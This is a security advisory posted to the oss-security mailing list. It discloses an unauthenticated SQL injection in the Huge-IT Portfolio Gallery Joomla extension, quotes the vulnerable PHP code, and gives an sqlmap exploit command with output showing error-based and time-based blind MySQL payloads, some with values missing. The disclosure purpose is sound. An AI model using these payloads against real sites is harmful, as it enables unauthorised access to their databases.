  oss-security - Unauthenticated SQL Injection in Huge-IT Portfolio Gallery            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Fri, 23 Sep From: "Larry W. Cashdollar" <larry0@...com> To: oss-security@...ts.openwall.com Subject: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery   Title: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin Author: Larry W. Cashdollar, @_larry0 Date: Download Site: http://huge-it.com/joomla-portfolio-gallery/ Vendor: huge-it.com, fixed Vendor Notified: Vendor Contact: info@...e-it.com Description: Huge-IT Portfolio Gallery extension can do wonders with your website. If you wish to show your photos, videos, enclosing the additional images and videos, then this Portfolio Gallery extension is what you need. Vulnerability: The following lines allow unauthenticated users to perform SQL injection against the functions in ajax_url.php: In file ajax_url.php: 11 define('_JEXEC',1); 12 defined('_JEXEC') or die('Restircted access'); . . . 49 $page = $_POST["page"]; 50 $num=$_POST['perpage']; 51 $start = $page * $num - $num; 52 $idofgallery=$_POST['galleryid']; 53 $level = $_POST['level']; 54 $query = $db->getQuery(true); 55 $query->select('*'); 56 $query->from('#__huge_itportfolio_images'); 57 $query->where('portfolio_id ='.$idofgallery); 58 $query ->order('#__huge_itportfolio_images.ordering asc'); 59 $db->setQuery($query,$start,$num);  Exploit Code: $ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.php' --level=5 --risk=3     (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of HTTP(s) requests: --- Parameter: #1* ((custom) POST)  Type: error-based  Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)  Payload: OR 1 GROUP BY (CASE WHEN THEN 1 ELSE 0 HAVING    Type: AND/OR time-based blind  Title: MySQL >= time-based blind - Parameter replace  Payload: page=1&galleryid=(CASE WHEN THEN SLEEP(5) ELSE --- [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian 8.0 (jessie) web application technology: Apache back-end DBMS: MySQL >= [WARNING] HTTP error codes detected during run: (Internal Server Error) - times [INFO] fetched data logged to text files under   [*] shutting down at  Advisory:    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      